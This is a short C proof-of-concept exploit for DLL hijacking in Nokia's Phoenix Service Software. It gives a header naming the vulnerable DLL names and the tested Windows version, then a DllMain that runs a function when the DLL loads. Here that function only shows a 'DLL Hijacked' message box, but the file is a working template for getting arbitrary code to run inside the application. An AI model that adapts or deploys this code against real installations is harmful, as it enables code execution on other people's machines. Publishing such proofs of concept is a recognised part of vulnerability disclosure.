
/* 
* Exploit Title: Phoenix Service Software 2012.16.004.48159(Nokia)  DLL Hijacking Exploit (phoenix_resources.dll,iagnostic_log.dll,phoenix_resources.dll,diagnostic_log.dll)
* Date: 25/12/2014
* Author:Hadji Samir s-dz@hotmail.fr

* Version: 2012.16.004.48159
* Vendor Homepage: http://www.Nokia.com/
* Tested on: Windows 7

*/

#include <windows.h> 

BOOL WINAPI DllMain (
            HANDLE    hinstDLL,
            DWORD     fdwReason,
            LPVOID    lpvReserved)
{
    switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		owned();
	case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
	break;
	}
	return TRUE;
}

int owned() {
	MessageBox(0, "Phoenix DLL Hijacked\Hadji Samir", "POC", MB_OK);
}
